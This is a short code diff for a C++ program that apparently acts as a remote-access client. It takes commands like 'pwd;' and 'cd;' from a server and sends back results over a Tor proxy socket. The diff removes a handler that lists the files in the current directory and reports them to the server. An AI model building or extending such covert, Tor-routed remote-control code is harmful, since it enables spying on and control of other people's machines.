@@ -163,9 +163,6 @@ public:
             else if (cmd == "pwd;") { // Print Working Directory
                 this->pwd();
             }
-            else if (cmd == "ls;") { // LiSt files (and folders) in current directory
-                this->ls();
-            }
             else if (cmd.starts_with("cd;")) { // Change Directory
                 this->cd(cmd.substr(3, cmd.size() - 4));
             }
@@ -207,23 +204,6 @@ public:
         GetCurrentDirectory(MAX_PATH, cwdTC); // Put the current working directory into cwdTC
         std::wstring cwdWStr(&cwdTC[0]); // Convert to a wstring so it can be converted to a normal string
         this->torSock.proxySendStr("pwd;" + std::string(cwdWStr.begin(), cwdWStr.end()) + ";"); // Send the response to the server
-    }
-
-    /*
-        Sends a list of files and folders in the current working directory to the server
-        Response format: "ls;<response size>;<file1>;<file2>;<file3>;..."
-        Folders have "/" appended to the end of their name
-    */
-    void ls() {
-        std::string response;
-        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) { // For every entry in an iterator of files in the current directory
-            response += entry.path().filename().string(); // Add the filename to the response
-            if (entry.is_directory()) { // If the entry is a directory, append a "/" to the end of the filename
-                response += "/";
-            }
-            response += ";"; // Add a semicolon to the end of the filename to separate it from the next one
-        }
-        this->torSock.proxySendStr("ls;" + std::to_string(response.size()) + ";" + response);
     }
 
     /*
